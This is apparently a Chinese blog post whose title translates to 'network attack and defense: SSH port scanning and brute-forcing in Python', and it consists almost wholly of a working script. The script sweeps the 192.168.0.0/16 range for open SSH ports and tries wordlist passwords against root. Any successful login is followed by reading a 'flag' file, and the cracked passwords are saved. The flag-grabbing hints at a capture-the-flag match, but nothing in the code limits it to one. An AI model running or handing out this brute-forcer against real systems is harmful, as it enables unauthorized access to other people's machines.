---
title: 网络攻防之——Python实现ssh端口扫描并爆破
categories: 网络攻防
copyright: true
date: 2019-04-08 10:23:38
tags:
- 网络攻防
- python
- ssh
- 爆破
- 端口扫描
---

# 代码示例

```
#!/usr/bin/python3
import threading
import pexpect
from socket import *

key = [pexpect.TIMEOUT, "#", "\$", ">", ">>>", "&"]
loginKey = [pexpect.TIMEOUT, "[p|P]assword", "yes"]

def getFlag(p, ret):
	p.sendline("cat ../../../../flag")
	p.expect(key)
	ret += "	flag:\n" + str(p.before)
	print(ret)
	file = open("flag.txt", "a+")
	file.write(ret)
	file.close()

def getPass(ip, passwd):
	p = pexpect.spawn("ssh root@" + ip, timeout=1)
	try:
		b = p.expect(loginKey)
		if b == 1:
			p.sendline(passwd)
			b = p.expect(key)
			if b > 0:
				getFlag(p, ip + "	passwd:" + passwd)
				return 1
	except:
		pass
	finally:
		p.close()
	return 0


def scan(ip):
	s = socket(AF_INET, SOCK_STREAM)
	s.settimeout(1)
	
	try:
		s.connect((ip, 22))
		b = True
		for n in open("passwd"):
			passwd = n.strip();
			if getPass(ip, passwd) == 1:
				b = False
				break
		if b:
			file = open("ip.txt", "a+")
			file.write(ip + "\n")
			file.close()

	except:
		pass
	finally:
		s.close()


for n in range(1, 255):
	for nn in range(1, 255):
		ip = "192.168." + str(n) + "." + str(nn)
		while True:
			if len(threading.enumerate()) < 255:
				break
		threading.Thread(target=scan, args=(ip,)).start()

```